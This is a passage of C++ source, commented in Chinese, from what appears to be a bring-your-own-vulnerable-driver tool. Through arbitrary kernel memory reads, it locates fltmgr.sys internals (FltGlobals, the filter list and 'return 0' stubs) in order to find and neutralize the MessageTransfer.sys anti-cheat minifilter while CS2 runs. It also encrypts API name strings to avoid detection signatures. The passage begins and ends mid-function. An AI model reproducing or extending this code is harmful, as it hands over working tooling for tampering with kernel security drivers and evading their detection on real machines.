                    if (chunk[off + j] != pattern[j]) { match = false; break; }
                }
                if (!match) continue;

                uint64_t stubAddr = addr + off;

                // 去重检查
                bool dup = false;
                for (size_t k = 0; k < collectedCount; k++) {
                    if (collected[k] == stubAddr) { dup = true; break; }
                }
                if (dup) continue;

                // 间距检查: 不同 stub 至少相距 16 字节 (避免同一函数内多个 ret 实例)
                bool tooClose = false;
                for (size_t k = 0; k < collectedCount; k++) {
                    uint64_t diff = (stubAddr > collected[k]) ? (stubAddr - collected[k])
                                                              : (collected[k] - stubAddr);
                    if (diff < 16) { tooClose = true; break; }
                }
                if (tooClose) continue;

                collected[collectedCount++] = stubAddr;
                patternFound[targetPatternIdx] = true;
                ByovdDiag("FLT:NTRL: stub[%zu] mode=%zu at flt+0x%llX\n",
                    collectedCount, targetPatternIdx,
                    (unsigned long long)(stubAddr - fltmgrBase));

                if (collectedCount >= maxStubs) break;

                // 找到 1 个此模式实例后, 跳出 chunk 扫描, 进入下一轮找其他模式
                // (这样 stub 列表中模式分布均匀)
                if (!patternFound[(targetPatternIdx + 1) % STUB_PATTERN_COUNT]) break;
            }
            if (collectedCount >= maxStubs) break;
        }
    }

    VirtualFree(chunk, 0, MEM_RELEASE);

    // 输出结果
    for (size_t i = 0; i < collectedCount && i < maxStubs; i++) {
        outStubs[i] = collected[i];
    }
    *outCount = collectedCount;

    if (collectedCount == 0) {
        ByovdDiag("FLT:NTRL: no ret0 stubs found in flt\n");
        return 0;
    }
    ByovdDiag("FLT:NTRL: collected %zu diverse stubs\n", collectedCount);
    // ★ v3.296: 缓存 stub 结果 (避免 GuardPac 周期性重复扫描)
    s_cachedStubFltBase = fltmgrBase;
    s_cachedStubCount = (collectedCount < MAX_STUB_INSTANCES) ? collectedCount : MAX_STUB_INSTANCES;
    for (size_t i = 0; i < s_cachedStubCount; i++) s_cachedStubs[i] = collected[i];
    return outStubs[0];  // 返回第一个 stub 地址 (兼容旧调用)
}

// 在 fltmgr.sys 内核镜像中扫描 "return 0" stub
// ★ BUILD 555 P2-3: 保留向后兼容 (内部转发到 FindRet0Stubs, 只取第一个)
static uint64_t FindRet0Stub(uint64_t fltmgrBase, uint64_t fltmgrSize) {
    uint64_t stubs[1] = {};
    size_t count = 0;
    FindRet0Stubs(fltmgrBase, fltmgrSize, stubs, 1, &count);
    return (count > 0) ? stubs[0] : 0;
}

// BUILD 467: Win11 兼容 — 新增 MOV RXX, imm64 (绝对地址) 模式
// 旧模式: LEA/MOV RXX, [RIP+rel32] (RIP-relative)
// 新模式: MOV RXX, imm64      (Win11 用绝对地址编码全局变量引用)
// ★ BUILD 475: 扩展扫描范围到 16KB + 新增 MOV [abs] 模式
static uint64_t ScanFuncForFltGlobals(uint64_t fltmgrBase, uint64_t targetFunc) {
    auto& kma = KernelMemoryAccessor::Instance();
    uint8_t buf[512] = {};

    for (int chunk = 0; chunk < 32; chunk++) {
        if (!kma.ReadKernelVA(targetFunc + chunk * 512, buf, sizeof(buf)))
            break;

        for (int i = 0; i < 500; i++) {
            // 模式1: LEA/MOV RXX, [RIP+rel32]: 48/4C/4D prefix + 8D/8B + ModRM [RIP]
            if ((buf[i] == 0x48 || buf[i] == 0x4C || buf[i] == 0x4D) &&
                (buf[i+1] == 0x8D || buf[i+1] == 0x8B) &&
                (buf[i+2] & 0xC7) == 0x05) {
                int32_t rel32 = *(int32_t*)(buf + i + 3);
                uint64_t candidate = targetFunc + chunk * 512 + i + 7 + rel32;
                if (candidate > fltmgrBase + 0x2000 && candidate < fltmgrBase + 0x200000) {
                    return candidate;
                }
            }
            // BUILD 467 模式2: MOV RXX, imm64 (Win11)
            //   48 B8~BF + 8字节立即数 — 直接引用全局地址
            else if (buf[i] == 0x48 && (buf[i+1] & 0xF8) == 0xB8 && i <= 492) {
                uint64_t absAddr = *(uint64_t*)(buf + i + 2);
                if (absAddr > fltmgrBase + 0x2000 && absAddr < fltmgrBase + 0x200000) {
                    return absAddr;
                }
            }
            // BUILD 475 模式3: MOV RAX, [absolute_address]
            //   48 A1 + 8字节绝对地址 (MOV RAX, moffs64)
            //   VS2022 在 Win11 上有时会生成此模式访问 .data 段
            else if (buf[i] == 0x48 && buf[i+1] == 0xA1 && i <= 491) {
                uint64_t absAddr = *(uint64_t*)(buf + i + 2);
                if (absAddr > fltmgrBase + 0x2000 && absAddr < fltmgrBase + 0x200000) {
                    return absAddr;
                }
            }
            // BUILD 475 模式4: MOV RAX, [RBX + imm32] — Win11 SIB 变体
            //   48 8B 83 XX XX XX XX — 通过寄存器基址访问 .data 段
            //   但需要验证计算后的地址是否在 .data 范围 — 此处跳过 (运行时依赖寄存器)
        }
    }
    return 0;
}

// ============================================================
// ★ BUILD 475: Win11 兼容 — 直接扫描 fltmgr .data 段找 FltGlobals
//
// 原理 (不依赖编译器指令编码):
//   FLT_GLOBALS 是一个巨大的全局结构体，位于 fltmgr.sys 的 .data 段
//   其第一个字段 FrameList 是一个 LIST_ENTRY (双向链表头):
//     +0x00: FrameList.Flink → 第一个 FLTP_FRAME
//     +0x08: FrameList.Blink → 最后一个 FLTP_FRAME
//
//   LIST_ENTRY 双向链表头的关键特征:
//     Flink->Blink == &head  (前一个节点的 Blink 指向链表头)
//
// 扫描策略:
//   1. 遍历 fltmgr .data 段, 找所有 16 字节对齐的 LIST_ENTRY
//   2. 每个候选: Flink/Blink 必须是内核地址且在 fltmgr 模块范围内
//   3. 验证回指: *(Flink + 8) 必须等于候选地址 (Flink->Blink == &head)
//   4. 交叉引用: 候选地址被至少 1 个已知 fltmgr 函数引用
// ============================================================
static uint64_t ScanDataSectionForFltGlobals(uint64_t fltmgrBase) {
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("FLT:NTRL: === .data section scan for FltGlobals (BUILD 475) ===\n");

    // 解析 PE 头获取 .data 段范围
    IMAGE_DOS_HEADER dos = {};
    if (!kma.ReadKernelVA(fltmgrBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    uint64_t ntHdrVA = fltmgrBase + dos.e_lfanew;
    IMAGE_NT_HEADERS64 nt = {};
    if (!kma.ReadKernelVA(ntHdrVA, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    uint64_t imageSize = nt.OptionalHeader.SizeOfImage;
    WORD numSections = nt.FileHeader.NumberOfSections;

    // 读段表 — VirtualAlloc 代替 std::vector
    DWORD secTableSize = numSections * sizeof(IMAGE_SECTION_HEADER);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)VirtualAlloc(
        nullptr, secTableSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!sections) {
        ByovdDiag("FLT:NTRL: .data scan - VirtualAlloc for sections failed\n");
        return 0;
    }

    uint64_t secTableVA = ntHdrVA + sizeof(IMAGE_NT_HEADERS64);
    if (!kma.ReadKernelVA(secTableVA, sections, secTableSize)) {
        VirtualFree(sections, 0, MEM_RELEASE);
        return 0;
    }

    // 找 .data 段 (或最大的 RW 段)
    uint64_t dataStart = 0, dataEnd = 0;
    for (WORD i = 0; i < numSections; i++) {
        // .data 段特征: 可读写, 名称包含 "data" 或 ".data"
        bool isData = (sections[i].Characteristics & IMAGE_SCN_MEM_READ) &&
                       (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
                       !(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE);
        if (isData) {
            uint64_t secVA = fltmgrBase + sections[i].VirtualAddress;
            uint64_t secEnd = secVA + sections[i].Misc.VirtualSize;
            // 取最大的 RW 段 (通常是 .data)
            if ((secEnd - secVA) > (dataEnd - dataStart)) {
                dataStart = secVA;
                dataEnd = secEnd;
            }
        }
    }
    // ★ BUILD 494: sections 延迟释放 — .text 段扫描还需要用它 (修复 USE-AFTER-FREE 崩溃)

    if (!dataStart || !dataEnd || dataEnd <= dataStart) {
        // 无法解析段 → 回退到估算范围
        dataStart = fltmgrBase + 0x2000;
        dataEnd   = fltmgrBase + (imageSize < 0x200000 ? imageSize : 0x200000);
        ByovdDiag("FLT:NTRL: .data scan - section parse failed, using estimated range +0x%llX..+0x%llX\n",
            dataStart - fltmgrBase, dataEnd - fltmgrBase);
    } else {
        ByovdDiag("FLT:NTRL: .data scan - parsed .data at +0x%llX..+0x%llX (%llu KB)\n",
            dataStart - fltmgrBase, dataEnd - fltmgrBase, (dataEnd - dataStart) / 1024);
    }

    // 分块扫描 .data 段 — VirtualAlloc 代替 std::vector
    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!chunk) {
        ByovdDiag("FLT:NTRL: .data scan - VirtualAlloc for chunk failed\n");
        // ★ v3.296 FIX-12: 释放之前分配的 sections (L5170), 避免内存泄漏
        VirtualFree(sections, 0, MEM_RELEASE);
        return 0;
    }

    // ★ 候选数组 (固定大小, 最大 64 个, 避免 std::vector CRT 依赖)
    struct Candidate { uint64_t addr; int refCount; };
    Candidate candidates[64] = {};
    int candidateCount = 0;

    for (uint64_t addr = dataStart; addr < dataEnd; addr += 0x10000) {
        uint64_t chunkEnd = (addr + 0x10000 < dataEnd) ? addr + 0x10000 : dataEnd;
        uint64_t chunkSize = chunkEnd - addr;
        if (!kma.ReadKernelVA(addr, chunk, chunkSize))
            continue;

        for (size_t off = 0; off + 16 <= chunkSize; off += 8) {
            uint64_t flink = *(uint64_t*)(chunk + off);
            uint64_t blink = *(uint64_t*)(chunk + off + 8);

            // 基本验证: 两个指针都是内核地址
            if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL)
                continue;

            // ★ 关键: Flink/Blink 必须在 fltmgr 模块范围 (FLTP_FRAME 在 fltmgr 内)
            if (flink < fltmgrBase || flink >= fltmgrBase + imageSize)
                continue;
            if (blink < fltmgrBase || blink >= fltmgrBase + imageSize)
                continue;

            // ★ 验证回指: Flink->Blink 应指向此 LIST_ENTRY 头
            uint64_t flinkBlink = 0;
            if (!kma.ReadKernelVA(flink + 8, &flinkBlink, 8))
                continue;
            if (flinkBlink != addr + off)
                continue;  // 不回指 → 不是双向链表头, 只是中间节点

            // 候选地址 = addr + off (FltGlobals 地址)
            uint64_t cand = addr + off;
            ByovdDiag("FLT:NTRL: .data scan candidate at flt+0x%llX (Flink=+0x%llX Blink=+0x%llX ✓back-ref)\n",
                cand - fltmgrBase, flink - fltmgrBase, blink - fltmgrBase);
            if (candidateCount < 64) {
                candidates[candidateCount].addr = cand;
                candidates[candidateCount].refCount = 0;
                candidateCount++;
            }
        }
    }

    VirtualFree(chunk, 0, MEM_RELEASE);
    chunk = nullptr;

    if (candidateCount == 0) {
        ByovdDiag("FLT:NTRL: .data scan - no LIST_ENTRY head candidates found\n");
        return 0;
    }

    // ★ BUILD 492: 全量 .text 段扫描 — 替代原来仅扫描 6 个函数×1024 字节的局限方案.
    //   遍历 fltmgr.sys 整个 .text 段, 搜索所有 RIP-relative 和 MOV RAX,imm64 指令,
    //   统计每个候选 FltGlobals 地址被引用的次数.
    //   真正的 FltGlobals 会被 fltmgr 内部大量函数引用, refCount 远高于噪声.
    ByovdDiag("FLT:NTRL: cross-ref: full .text section scan (BUILD 492)...\n");

    // 找 .text 段
    uint64_t textStart = 0, textEnd = 0;
    for (WORD i = 0; i < numSections; i++) {
        char name[9] = {};
        memcpy(name, sections[i].Name, 8);
        if (strstr(name, ".text") || (sections[i].Characteristics & 0x20000000)) {
            textStart = fltmgrBase + sections[i].VirtualAddress;
            textEnd   = textStart + sections[i].Misc.VirtualSize;
            ByovdDiag("FLT:NTRL: cross-ref: .text at 0x%llX..0x%llX (%llu KB)\n",
                textStart, textEnd, (textEnd - textStart) / 1024);
            break;
        }
    }
    if (!textStart || !textEnd || textEnd <= textStart) {
        // 回退: 估算 .text 范围 (通常在 image 开头)
        textStart = fltmgrBase + 0x1000;
        textEnd   = fltmgrBase + 0x20000;  // 128KB 足够覆盖 fltmgr .text
        ByovdDiag("FLT:NTRL: cross-ref: .text fallback 0x%llX..0x%llX\n", textStart, textEnd);
    }

    // 分块读取 .text 段, 扫描每个候选的引用
    const SIZE_T TXT_CHUNK = 0x2000;  // 8KB chunks
    uint8_t* txtBuf = (uint8_t*)VirtualAlloc(nullptr, TXT_CHUNK, MEM_COMMIT, PAGE_READWRITE);
    if (!txtBuf) {
        VirtualFree(sections, 0, MEM_RELEASE);
        ByovdDiag("FLT:NTRL: cross-ref: VirtualAlloc failed\n");
        return 0;
    }

    for (uint64_t cur = textStart; cur < textEnd; cur += TXT_CHUNK) {
        SIZE_T readSize = (cur + TXT_CHUNK <= textEnd) ? TXT_CHUNK : (SIZE_T)(textEnd - cur);
        if (!kma.ReadKernelVA(cur, txtBuf, readSize)) continue;

        for (SIZE_T i = 0; i + 7 < readSize; i++) {
            // 模式1: REX.W LEA r64, [RIP+disp32]  → 48/4C 8D 05 XX XX XX XX
            // 模式2: REX.W MOV r64, [RIP+disp32]  → 48/4C 8B 05 XX XX XX XX
            if ((txtBuf[i] == 0x48 || txtBuf[i] == 0x4C) &&
                (txtBuf[i+1] == 0x8D || txtBuf[i+1] == 0x8B) &&
                (txtBuf[i+2] & 0xC7) == 0x05) {
                int32_t rel32 = *(int32_t*)(txtBuf + i + 3);
                uint64_t target = cur + i + 7 + rel32;
                for (int ci = 0; ci < candidateCount; ci++) {
                    if (target == candidates[ci].addr) {
                        candidates[ci].refCount++;
                    }
                }
            }
            // 模式3: MOV RAX/R10-R15, imm64 → 48/49/4C/4D B8~BF + imm64
            else if (i + 9 < readSize &&
                     ((txtBuf[i] == 0x48 || txtBuf[i] == 0x49 || txtBuf[i] == 0x4C || txtBuf[i] == 0x4D) &&
                      (txtBuf[i+1] & 0xF8) == 0xB8)) {
                uint64_t absAddr = *(uint64_t*)(txtBuf + i + 2);
                for (int ci = 0; ci < candidateCount; ci++) {
                    if (absAddr == candidates[ci].addr) {
                        candidates[ci].refCount++;
                    }
                }
            }
        }
    }

    VirtualFree(txtBuf, 0, MEM_RELEASE);
    VirtualFree(sections, 0, MEM_RELEASE);

    // 选择 refCount 最高的候选
    int bestIdx = -1;
    int bestRef = 0;
    for (int ci = 0; ci < candidateCount; ci++) {
        ByovdDiag("FLT:NTRL: .data candidate +0x%llX refCount=%d\n",
            candidates[ci].addr - fltmgrBase, candidates[ci].refCount);
        if (candidates[ci].refCount > bestRef) {
            bestRef = candidates[ci].refCount;
            bestIdx = ci;
        }
    }

    if (bestIdx >= 0 && bestRef >= 2) {
        // ★ 至少 2 次引用才认为有效 (排除噪声)
        ByovdDiag("FLT:NTRL: .data scan BEST candidate at flt+0x%llX (refCount=%d) ✓ CONFIRMED\n",
            candidates[bestIdx].addr - fltmgrBase, bestRef);
        return candidates[bestIdx].addr;
    }

    if (bestIdx >= 0 && bestRef == 1) {
        ByovdDiag("FLT:NTRL: .data scan — only 1 ref, WEAK confidence at flt+0x%llX\n",
            candidates[bestIdx].addr - fltmgrBase);
        return candidates[bestIdx].addr;
    }

    ByovdDiag("FLT:NTRL: .data scan — ALL refCount=0, FltGlobals NOT FOUND (full .text scan)\n");
    return 0;
}

// ============================================================
// BUILD 455/457: 多函数 fallback 查找 FltGlobals + MOV 变体
// 先 LEA 后 MOV 扫描 RIP-relative 指令 → fltmgr .data 段
// ★ BUILD 475: sigscan 失败后自动 fallback 到 .data section scan
// ★ BUILD 555 P2-verify: 11 个 Flt* API 名 STEALTH_STR_DECRYPT_TO 加密 (原明文数组进入 .rdata)
// ★ BUILD 567 v3.296: 添加 FltGlobals 缓存 — GuardPac 每 30-45s 调用 IsMessageTransferNeutralized,
//   每次重新扫描 fltmgr 导出 + 函数代码 = 1000+ IOCTL, 5分钟 6000-10000 IOCTL 接近卡死阈值.
//   FltGlobals 地址在 fltmgr.sys 加载后不变, 安全缓存.
static uint64_t s_cachedFltGlobals = 0;
static uint64_t s_cachedFltGlobalsBase = 0;  // 缓存对应的 fltmgrBase (验证缓存有效性)

uint64_t MinifilterNeutralizer::FindFltGlobals(uint64_t fltmgrBase) {
    // ★ v3.296: 缓存命中检查 — fltmgrBase 匹配且缓存有效时直接返回
    if (s_cachedFltGlobals && s_cachedFltGlobalsBase == fltmgrBase) {
        return s_cachedFltGlobals;
    }

    // 每个导出名独立栈缓冲区解密, 消除 .rdata 明文特征
    char fltName1[48] = {};  // FltEnlistFilterForDriverInterface (最长 35 字符 + NUL)
    char fltName2[40] = {};  // FltGetVolumeFromName
    char fltName3[40] = {};  // FltGetVolumeFromFileObject
    char fltName4[32] = {};  // FltRegisterFilter
    char fltName5[32] = {};  // FltStartFiltering
    char fltName6[32] = {};  // FltUnregisterFilter
    char fltName7[40] = {};  // FltGetFileNameInformation
    char fltName8[40] = {};  // FltQueryInformationFile
    char fltName9[32] = {};  // FltCreateFile
    char fltName10[32] = {}; // FltReadFile
    char fltName11[40] = {}; // FltInitializePushLock
    STEALTH_STR_DECRYPT_TO("FltEnlistFilterForDriverInterface", fltName1, sizeof(fltName1));
    STEALTH_STR_DECRYPT_TO("FltGetVolumeFromName",            fltName2, sizeof(fltName2));
    STEALTH_STR_DECRYPT_TO("FltGetVolumeFromFileObject",      fltName3, sizeof(fltName3));
    STEALTH_STR_DECRYPT_TO("FltRegisterFilter",                fltName4, sizeof(fltName4));
    STEALTH_STR_DECRYPT_TO("FltStartFiltering",                fltName5, sizeof(fltName5));
    STEALTH_STR_DECRYPT_TO("FltUnregisterFilter",              fltName6, sizeof(fltName6));
    STEALTH_STR_DECRYPT_TO("FltGetFileNameInformation",        fltName7, sizeof(fltName7));
    STEALTH_STR_DECRYPT_TO("FltQueryInformationFile",          fltName8, sizeof(fltName8));
    STEALTH_STR_DECRYPT_TO("FltCreateFile",                    fltName9, sizeof(fltName9));
    STEALTH_STR_DECRYPT_TO("FltReadFile",                      fltName10, sizeof(fltName10));
    STEALTH_STR_DECRYPT_TO("FltInitializePushLock",            fltName11, sizeof(fltName11));
    const char* exportNames[] = {
        fltName1,  // Win10 21H2+ (主路径)
        fltName2,  // 所有版本通用
        fltName3,  // 所有版本通用
        fltName4,  // 所有版本通用 (最可靠)
        fltName5,  // 所有版本通用
        fltName6,  // 所有版本通用
        fltName7,  // 所有版本通用
        fltName8,  // 所有版本通用
        fltName9,  // 所有版本通用
        fltName10, // 所有版本通用
        fltName11, // 所有版本通用
    };

    for (const char* exportName : exportNames) {
        uint64_t targetFunc = KernelMemoryAccessor::Instance().ResolveExport(fltmgrBase, exportName);
        if (!targetFunc) {
            ByovdDiag("FLT:NTRL: %s not exported\n", exportName);
            continue;
        }
        uint64_t candidate = ScanFuncForFltGlobals(fltmgrBase, targetFunc);
        if (candidate) {
            // ★ BUILD 461: 验证候选地址 — 读取前 8 字节, 必须是有效内核地址
            uint64_t firstQword = 0;
            if (KernelMemoryAccessor::Instance().ReadKernelVA(candidate, &firstQword, 8)) {
                if (firstQword >= 0xFFFF800000000000ULL && firstQword < 0xFFFFFFFFFFFFFFFFULL) {
                    // ★ BUILD 472: 二级验证 — 读 qword[0] 指向的地址,
                    //   扫 FilterList 偏移, 必须有 LIST_ENTRY 特征 (Flink/Blink 都是内核地址)
                    // ★ v3.296: 扩展到 0x080-0x180 (覆盖 Win11 24H2 RegisteredFilters.rList@+0x0a0)
                    for (uint32_t flOff = 0x080; flOff <= 0x180; flOff += 8) {
                        uint64_t flPair[2] = {};
                        if (KernelMemoryAccessor::Instance().ReadKernelVA(
                                firstQword + flOff, flPair, 16)) {
                            if (flPair[0] >= 0xFFFF800000000000ULL &&
                                flPair[1] >= 0xFFFF800000000000ULL) {
                                ByovdDiag("FLT:NTRL: FltGlobals at 0x%llX (via %s) struct-verified (flOff=0x%X Flink=0x%llX)\n",
                                    (unsigned long long)candidate, exportName,
                                    flOff, (unsigned long long)flPair[0]);
                                // ★ v3.296: 缓存 FltGlobals (避免 GuardPac 周期性重复扫描)
                                s_cachedFltGlobals = candidate;
                                s_cachedFltGlobalsBase = fltmgrBase;
                                return candidate;
                            }
                        }
                    }
                    ByovdDiag("FLT:NTRL: %s candidate 0x%llX qword[0]=0x%llX valid ptr but no LIST_ENTRY found\n",
                        exportName, (unsigned long long)candidate, (unsigned long long)firstQword);
                    // fall through — try next export
                } else {
                    ByovdDiag("FLT:NTRL: %s candidate 0x%llX rejected (qword=0x%016llX not kernel ptr)\n",
                        exportName, (unsigned long long)candidate, (unsigned long long)firstQword);
                }
            }
        } else {
            ByovdDiag("FLT:NTRL: %s found but no .data LEA/MOV ref\n", exportName);
        }
    }
    ByovdDiag("FLT:NTRL: FltGlobals not found via any export\n");

    // ★ BUILD 475: sigscan 失败 → fallback 到 .data section 直接扫描
    ByovdDiag("FLT:NTRL: falling back to .data section scan (BUILD 475)...\n");
    uint64_t dataScanResult = ScanDataSectionForFltGlobals(fltmgrBase);
    if (dataScanResult) {
        StateLog("FLT", "FltGlobalsDataScan", "addr=0x%llX", (unsigned long long)dataScanResult);
        ByovdDiag("FLT:NTRL: .data scan SUCCESS at 0x%llX\n", (unsigned long long)dataScanResult);
        // ★ v3.296: 缓存 FltGlobals (避免 GuardPac 周期性重复扫描)
        s_cachedFltGlobals = dataScanResult;
        s_cachedFltGlobalsBase = fltmgrBase;
        return dataScanResult;
    }

    StateLog("FLT", "FltGlobalsNotFound", "");
    return 0;
}

// ============================================================
// ★ BUILD 502: Win11 直接字符串扫描 — 绕过 FrameList 依赖
// ★ BUILD 567 v3.296 REWRITE: 完全重写 — 通过 FltGlobals 遍历 FilterList
//
// 原 BUILD 502 实现: 扫描 fltmgr .data 段找 UNICODE_STRING.
//   根本错误: FLT_FILTER 在内核池分配, 不在 fltmgr .data 段.
//   FLT_FILTER.Name.Buffer 也指向池分配. 所以扫描 fltmgr .data 段
//   永远找不到 FLT_FILTER.Name.
//
// v3.296 新策略: 通过 FltGlobals → FLTP_FRAME → FilterList 遍历,
//   对每个 FLT_FILTER 候选验证 Name 字段. 这与 FindFilterByName 相同,
//   但使用更严格的 FLT_FILTER 布局验证 (PrimaryLink@+0x10, Name@+0x38).
//
// 此函数作为 FindFilterByName 的回退, 当 FindFilterByName 的
// ActiveLink 偏移尝试失败时调用.
// ============================================================
static uint64_t FindFilterByStringScan(uint64_t fltmgrBase, uint64_t fltGlobals, const wchar_t* targetName) {
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("FLT:STRSCAN: === v3.296 FilterList traversal ===\n");
    StateLog("FLT", "StrScanStart", "");

    if (!fltGlobals) {
        StateLog("FLT", "StrScanFail", "step=no FltGlobals");
        return 0;
    }
    // ★ v3.296 FIX-18: 检查 PAC 驱动是否已加载 — 防止 CS2 退出时蓝屏
    //   CS2 退出过程中, PAC minifilter (MessageTransfer.sys) 先被卸载
    //   (FltUnregisterFilter → FLT_FILTER 释放), 但 CS2 进程对象还未完全退出
    //   (GetExitCodeProcess 仍返回 STILL_ACTIVE). 此时遍历 FilterList 会访问
    //   已释放的池内存 → BSOD 0x50.
    //   修复: 如果 MessageTransfer.sys 已从 PsLoadedModuleList 消失,
    //         说明 PAC minifilter 已卸载, 立即返回, 不遍历链表.
    {
        char mtName[32];
        STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", mtName, sizeof(mtName));
        uint64_t mtBase = kma.GetKernelModuleBase(mtName);
        SecureZeroMemory(mtName, sizeof(mtName));
        if (!mtBase) {
            StateLog("FLT", "StrScanSkip", "reason=PAC driver unloaded");
            ByovdDiag("FLT:STRSCAN: PAC driver (MessageTransfer.sys) not loaded, skip\n");
            return 0;
        }
    }

    // Step 2: 遍历 FltGlobals 中的 FLTP_FRAME 指针, 找 FilterList
    uint64_t globQw[16] = {};
    for (int i = 0; i < 16; i++) {
        kma.ReadKernelVA(fltGlobals + i * 8, &globQw[i], 8);
    }

    // FLTP_FRAME.RegisteredFilters.rList 偏移候选 (Win10/11 x64)
    uint64_t filterListOffsets[] = {
        0x080, 0x088, 0x090, 0x098, 0x0a0, 0x0a8, 0x0b0, 0x0b8,
        0x0c0, 0x0c8, 0x0d0, 0x0d8, 0x0e0, 0x0e8, 0x0f0, 0x0f8,
        0x100, 0x108, 0x110, 0x118, 0x120, 0x128, 0x130, 0x138,
        0x140, 0x148, 0x150, 0x158, 0x160, 0x168, 0x170, 0x178,
        0x180,
    };

    // 计算目标名称字节长度
    size_t targetNameLen = 0;
    while (targetName[targetNameLen]) targetNameLen++;
    uint16_t targetByteLen = (uint16_t)(targetNameLen * 2);

    // 遍历每个 FLTP_FRAME 候选
    int validFrameCount = 0;
    int validListCount = 0;
    int filterEntryCount = 0;
    int flagsMatchCount = 0;
    for (int qi = 0; qi < 16; qi++) {
        uint64_t frame = globQw[qi];
        if (frame < 0xFFFF800000000000ULL) continue;

        // 验证 frame 指向有效内存
        uint64_t firstQw = 0;
        if (!kma.ReadKernelVA(frame, &firstQw, 8)) continue;
        if (firstQw < 0xFFFF800000000000ULL) continue;
        validFrameCount++;

        // 尝试每个 FilterList 偏移
        for (uint64_t flOff : filterListOffsets) {
            uint64_t listHead = frame + flOff;
            uint64_t flink = 0, blink = 0;
            if (!kma.ReadKernelVA(listHead, &flink, 8)) continue;
            if (!kma.ReadKernelVA(listHead + 8, &blink, 8)) continue;
            if (flink == listHead || flink < 0xFFFF800000000000ULL ||
                blink < 0xFFFF800000000000ULL) continue;
            validListCount++;

            // 遍历 FilterList 链表
            uint64_t cur = flink;
            int entryCount = 0;
            for (int iter = 0; iter < 100 && cur && cur != listHead; iter++) {
                entryCount++;
                // ★ v3.296: PrimaryLink.Flink 在 FLT_OBJECT+0x10
                //   所以 FLT_FILTER 基址 = cur - 0x10
                uint64_t filterBase = cur - 0x10;

                // 验证 FLT_OBJECT.Flags@+0x00: FLT_OBFL_TYPE_FILTER (0x2000000)
                uint32_t flags = 0;
                if (!kma.ReadKernelVA(filterBase + 0x00, &flags, 4)) break;
                if (!(flags & 0x2000000)) {
                    // 尝试其他 ActiveLink 偏移 (兼容性)
                    uint64_t alOffs[] = { 0x10, 0x18, 0x20, 0x28, 0x30 };
                    bool found = false;
                    for (uint64_t alOff : alOffs) {
                        uint64_t fb = cur - alOff;
                        uint32_t f2 = 0;
                        if (kma.ReadKernelVA(fb, &f2, 4) && (f2 & 0x2000000)) {
                            filterBase = fb;
                            found = true;
                            break;
                        }
                    }
                    if (!found) {
                        // 读下一个条目
                        uint64_t nextFlink = 0;
                        if (!kma.ReadKernelVA(cur, &nextFlink, 8) ||
                            nextFlink < 0xFFFF800000000000ULL) break;
                        cur = nextFlink;
                        continue;
                    }
                }
                flagsMatchCount++;
                filterEntryCount++;

                // 读取 Name (UNICODE_STRING: Length, MaxLength, Buffer)
                // ★ v3.296: 优先尝试标准偏移 0x38, 失败时尝试其他偏移
                uint64_t nameOffs[] = { 0x38, 0x40, 0x48, 0x50, 0x30, 0x28 };
                bool nameDumped = false;
                for (uint64_t no : nameOffs) {
                    uint16_t nameLen = 0;
                    uint16_t nameMax = 0;
                    uint64_t nameBuf = 0;
                    if (!kma.ReadKernelVA(filterBase + no, &nameLen, 2)) continue;
                    if (!kma.ReadKernelVA(filterBase + no + 2, &nameMax, 2)) continue;
                    if (!kma.ReadKernelVA(filterBase + no + 8, &nameBuf, 8)) continue;

                    // ★ v3.296 FIX-17 DIAG: dump 所有 filter 名称 (不论长度是否匹配)
                    //   目的: 诊断为什么找不到 PAC filter — 看看系统里到底加载了哪些 minifilter
                    if (nameLen > 0 && nameLen <= 256 && nameLen % 2 == 0 &&
                        nameMax >= nameLen && nameMax <= 512 &&
                        nameBuf >= 0xFFFF800000000000ULL && nameBuf < 0xFFFFFD0000000000ULL) {
                        wchar_t diagName[128] = {};
                        if (kma.ReadKernelVA(nameBuf, diagName, nameLen)) {
                            diagName[nameLen / 2] = 0;
                            StateLog("FLT", "FilterDump",
                                     "filter=0x%llX noff=0x%llX len=%d name='%ls'",
                                     (unsigned long long)filterBase,
                                     (unsigned long long)no,
                                     (int)nameLen, diagName);
                            nameDumped = true;
                        }
                    }

                    if (nameLen != targetByteLen || nameMax < nameLen ||
                        nameMax > 512 || nameBuf < 0xFFFF800000000000ULL) continue;

                    // 读取字符串内容
                    // ★ v3.296 FIX: 显式检查 nameLen <= 256, 防止栈缓冲区溢出
                    //   strBuf[128] = 256 字节, nameLen 最大 512 会溢出
                    //   (虽然 nameLen != targetByteLen 间接限制, 但防御性编程)
                    if (nameLen > 256) continue;
                    wchar_t strBuf[128] = {};
                    if (!kma.ReadKernelVA(nameBuf, strBuf, nameLen)) continue;
                    strBuf[nameLen / 2] = 0;
                    if (_wcsicmp(strBuf, targetName) != 0) continue;

                    // 名称匹配! 验证 Operations@+0x1a8
                    // ★ v3.296 FIX: Operations 在固定偏移, 不依赖 nameOff, 只需验证一次
                    uint64_t opsVal = 0;
                    if (!kma.ReadKernelVA(filterBase + 0x1a8, &opsVal, 8) ||
                        opsVal <= 0xFFFF800000000000ULL) break;  // Operations 无效, 跳到下一个 filter
                    uint8_t mj = 0;
                    if (!kma.ReadKernelVA(opsVal, &mj, 1)) break;
                    if (mj > 0x1B && mj != 0x80) break;

                    StateLog("FLT", "StrScanFound",
                             "filter=0x%llX ops=0x%llX frame=%d flOff=0x%llX noff=0x%llX",
                             (unsigned long long)filterBase,
                             (unsigned long long)opsVal, qi,
                             (unsigned long long)flOff, (unsigned long long)no);
                    ByovdDiag("FLT:STRSCAN: FOUND FLT_FILTER at 0x%llX (frame[%d] flOff=0x%llX noff=0x%llX ops=0x%llX)\n",
                        (unsigned long long)filterBase, qi,
                        (unsigned long long)flOff, (unsigned long long)no,
                        (unsigned long long)opsVal);
                    return filterBase;
                }

